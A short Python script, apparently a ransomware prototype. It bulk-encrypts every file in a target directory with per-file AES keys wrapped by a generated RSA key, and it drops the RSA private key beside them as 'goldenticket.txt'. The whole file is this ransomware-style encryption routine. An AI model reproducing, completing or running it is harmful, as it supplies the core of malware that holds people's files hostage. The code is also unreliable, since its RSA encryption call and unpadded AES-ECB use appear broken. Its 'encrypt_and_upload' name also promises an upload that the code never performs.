import os
import sys
import random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

def generate_rsa_key_pair():
   # Generate RSA key pair (public and private keys)
   key = RSA.generate(2048)
   public_key = key.publickey().export_key()
   private_key = key.export_key()
   return public_key, private_key

def save_rsa_private_key(private_key, target_directory):
   # Write RSA private key to a file in the target directory
   private_key_file = os.path.join(target_directory, "goldenticket.txt")
   with open(private_key_file, "wb") as file:
       file.write(private_key)

def encrypt_file(file_path, rsa_public_key):
   # Generate a random AES key
   aes_key = get_random_bytes(32)
   # Encrypt the AES key with RSA public key
   rsa_cipher = RSA.import_key(rsa_public_key)
   rsa_encrypted_key = rsa_cipher.encrypt(aes_key, None)[0]
   # Read the contents of the file
   with open(file_path, "rb") as file:
       content = file.read()
   # Encrypt the file content with AES
   cipher = AES.new(aes_key, AES.MODE_ECB)
   encrypted_content = cipher.encrypt(content)
   # Write the encrypted data and the RSA-encrypted AES key to a new file
   with open(file_path + ".encrypted", "wb") as encrypted_file:
       encrypted_file.write(rsa_encrypted_key)
       encrypted_file.write(encrypted_content)

if __name__ == "__main__":
   # Check if the correct number of command-line arguments is provided
   if len(sys.argv) != 2:
       print("Usage: python encrypt_and_upload.py <target_directory>")
       sys.exit(1)
   # Extract target directory from command-line arguments
   target_directory = sys.argv[1]
   # Generate RSA key pair
   rsa_public_key, rsa_private_key = generate_rsa_key_pair()
   # Save RSA private key to a file in the target directory
   save_rsa_private_key(rsa_private_key, target_directory)
   # Get all files in the target directory
   files = os.listdir(target_directory)
   for file_name in files:
       file_path = os.path.join(target_directory, file_name)
       if os.path.isfile(file_path) and file_name != "goldenticket.txt":
           # Encrypt the file (exclude goldenticket.txt)
           encrypt_file(file_path, rsa_public_key)
   print("File encryption completed.")